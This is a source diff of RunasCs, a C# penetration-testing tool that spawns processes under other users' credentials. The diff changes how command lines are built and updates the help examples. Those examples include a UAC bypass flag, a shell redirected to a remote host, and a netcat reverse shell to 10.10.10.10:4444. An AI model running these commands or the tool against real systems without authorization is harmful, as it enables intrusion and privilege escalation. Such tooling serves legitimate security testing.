@@ -387,6 +387,20 @@ public class RunasCs
         return result;
     }
 
+    private string ParseCommonProcessesInCommandline(string commandline) {
+        string commandlineRet = commandline;
+        string[] args = commandline.Split(' ');
+        if (args[0].ToLower() == "cmd" || args[0].ToLower() == "cmd.exe") {
+            args[0] = Environment.GetEnvironmentVariable("COMSPEC");
+            commandlineRet = string.Join(" ", args);
+        }
+        if (args[0].ToLower() == "powershell" || args[0].ToLower() == "powershell.exe") {
+            args[0] = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\WindowsPowerShell\v1.0\powershell.exe";
+            commandlineRet = string.Join(" ", args);
+        }
+        return commandlineRet;
+    }
+
     public void CleanupHandles()
     {
         if(this.hOutputReadTmp != IntPtr.Zero) CloseHandle(this.hOutputReadTmp);
@@ -415,7 +429,6 @@ public class RunasCs
         string output = "";
         string desktopName = "";
         string commandLine = cmd;
-        string processPath = null;
         int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
         int logonFlags = (createUserProfile) ? (int)LOGON_WITH_PROFILE : 0;
 
@@ -450,8 +463,7 @@ public class RunasCs
             startupInfo.dwFlags = Startf_UseStdHandles;
             startupInfo.hStdOutput = this.hOutputWrite;
             startupInfo.hStdError = this.hErrorWrite;
-            processPath = Environment.GetEnvironmentVariable("ComSpec");
-            commandLine = "/c " + cmd;
+            commandLine = ParseCommonProcessesInCommandline(commandLine);
 
         } else if (remote != null) {
             this.socket = ConnectRemote(remote);
@@ -478,7 +490,7 @@ public class RunasCs
             {
                 if (domainName == "")
                     domainName = ".";
-                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
                 if (success == false)
                     throw new RunasCsException("CreateProcessWithLogonW logon type 9 failed with " + Marshal.GetLastWin32Error());
             }
@@ -492,7 +504,7 @@ public class RunasCs
                 {
                     if (bypassUac)
                     {
-                        success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, processPath, commandLine, ref startupInfo, out processInfo);
+                        success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, null, commandLine, ref startupInfo, out processInfo);
                         if (success == false)
                             throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
                     }
@@ -500,13 +512,13 @@ public class RunasCs
                     {
                         Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
                         Console.Out.Flush();
-                        success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                        success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
                         if (success == false)
                             throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
                     }
                 }
                 else {
-                    success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                    success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
                     if (success == false)
                         throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
                 }
@@ -534,7 +546,7 @@ public class RunasCs
             {
                 if (bypassUac)
                 {
-                    success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, processPath, commandLine, ref startupInfo, out processInfo);
+                    success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, null, commandLine, ref startupInfo, out processInfo);
                     if (success == false)
                         throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
                 }
@@ -560,14 +572,14 @@ public class RunasCs
                     IntPtr lpEnvironment = IntPtr.Zero;
                     GetUserEnvironmentBlock(hTokenDuplicate, username, createUserProfile, out lpEnvironment);
                     //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
-                    success = CreateProcessAsUser(hTokenDuplicate, processPath, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
+                    success = CreateProcessAsUser(hTokenDuplicate, null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
                     if (success == false)
                         throw new RunasCsException("CreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error());
                     if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
                 }
                 else if (createProcessFunction == 1)
                 {
-                    success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, processPath, commandLine, CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, out processInfo);
+                    success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, null, commandLine, CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, out processInfo);
                     if (success == false)
                         throw new RunasCsException("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
                 }
@@ -1542,8 +1554,8 @@ Description:
 Positional arguments:
     username                username of the user
     password                password of the user
-    cmd                     command supported by cmd.exe if process_timeout>0
-                            commandline for the process if process_timeout=0
+    cmd                     commandline for the process
+
 Optional arguments:
     -d, --domain domain
                             domain of the user, if in a domain. 
@@ -1565,8 +1577,8 @@ Optional arguments:
                             the waiting time (in ms) for the created process.
                             This will halt RunasCs until the spawned process
                             ends and sent the output back to the caller.
-                            If you set 0 no output will be retrieved and cmd.exe
-                            won't be used to spawn the process.
+                            If you set 0 no output will be retrieved and an 
+                            async process will be created.
                             Default: ""120000""
     -p, --create-profile
                             if this flag is specified RunasCs will force the
@@ -1582,17 +1594,17 @@ Optional arguments:
 
 Examples:
     Run a command as a specific local user
-        RunasCs.exe user1 password1 whoami
+        RunasCs.exe user1 password1 ""cmd /c whoami /all""
     Run a command as a specific domain user and interactive logon type (2)
-        RunasCs.exe user1 password1 whoami -d domain -l 2
+        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 2
     Run a background/async process as a specific local user,
-        RunasCs.exe user1 password1 ""%COMSPEC% powershell -enc..."" -t 0
+        RunasCs.exe user1 password1 ""C:\\nc64.exe 10.10.10.10 4444 -e cmd.exe"" -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
     Run a command simulating the /netonly flag of runas.exe 
-        RunasCs.exe user1 password1 whoami -d domain -l 9
+        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 9
     Run a command as an Administrator bypassing UAC
-        RunasCs.exe adm1 password1 ""whoami /priv"" --bypass-uac
+        RunasCs.exe adm1 password1 ""cmd /c whoami /priv"" --bypass-uac
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
@@ -1820,13 +1832,15 @@ class MainClass
         string[] argsTest = new string[10];
         argsTest[0] = "temp8";
         argsTest[1] = "pwd";
-        argsTest[2] = "cmd /c set";
-        //argsTest[2] = "ping -n 30 127.0.0.1";
+        argsTest[2] = "cmd.exe";
+        //argsTest[2] = "C:\\Windows\\system32\\ping.exe -n 30 127.0.0.1";
         argsTest[3] = "--function";
-        argsTest[4] = "0";
+        argsTest[4] = "2";
         argsTest[5] = "--logon-type";
         argsTest[6] = "8";
         //argsTest[7] = "--create-profile";
+        //argsTest[7] = "--remote";
+        //argsTest[8] = "127.0.0.1:3001";
         Console.Out.Write(RunasCsMainClass.RunasCsMain(argsTest));
     }
 }
